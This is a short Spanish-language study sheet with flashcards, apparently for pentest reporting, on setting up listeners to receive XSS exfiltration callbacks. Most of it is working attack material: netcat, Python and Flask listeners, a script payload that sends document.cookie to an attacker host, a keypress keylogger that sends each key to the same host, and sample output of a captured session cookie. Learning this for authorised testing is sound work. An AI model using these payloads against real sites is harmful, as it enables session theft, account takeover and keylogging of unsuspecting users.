**Cómo “escuchar” los callbacks (XSS exfiltration)**

Necesitás un **listener HTTP** que reciba requests desde el navegador víctima cuando se ejecute el JavaScript.

### Opción 1 — netcat (mínimo)

```
nc -lvnp 80
```

Luego usar:

```html
<script>
fetch('http://ATTACKER_IP/?c='+document.cookie)
</script>
```

El navegador hace un GET. `nc` muestra la request completa.

Limitación: sin parseo, sin logs persistentes.

---

### Opción 2 — Python HTTP server (recomendado)

```
python3 -m http.server 80
```

Payload:

```html
<script>
fetch('http://ATTACKER_IP/?c='+document.cookie)
</script>
```

Los parámetros aparecen en stdout:

```
"GET /?c=PHPSESSID=abcd1234 HTTP/1.1"
```

---

### Opción 3 — Flask listener (control total)

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def index():
    print(request.query_string.decode())
    return 'OK'

app.run(host='0.0.0.0', port=80)
```

Ideal para:

* Cookies
* Keystrokes
* Tokens
* Headers

---

### Para keylogger

Payload:

```html
<script>
document.addEventListener('keypress', e => {
  fetch('http://ATTACKER_IP/k?key=' + e.key)
})
</script>
```

Listener recibe:

```
/k?key=a
/k?key=d
/k?key=m
```

---

## FLASHCARD — Stored XSS Listener

**Q:** ¿Qué es un listener en XSS?
**A:** Un servidor que recibe callbacks HTTP desde JavaScript ejecutado en la víctima.

**Q:** Forma más simple de escuchar?
**A:** `nc -lvnp 80`

**Q:** Forma práctica y estable?
**A:** `python3 -m http.server 80`

**Q:** Payload típico de exfiltración?

```html
<script>
fetch('http://IP/?c='+document.cookie)
</script>
```

**Q:** Qué demuestra esto en un reporte?
**A:** Robo de sesión / ejecución arbitraria en contexto del usuario.

**Q:** Impacto real del PoC?
**A:** Account takeover, keylogging, CSRF chaining.

**Q:** Por qué NO usar alert en producción?
**A:** No demuestra impacto ni exfiltración.

Fin.
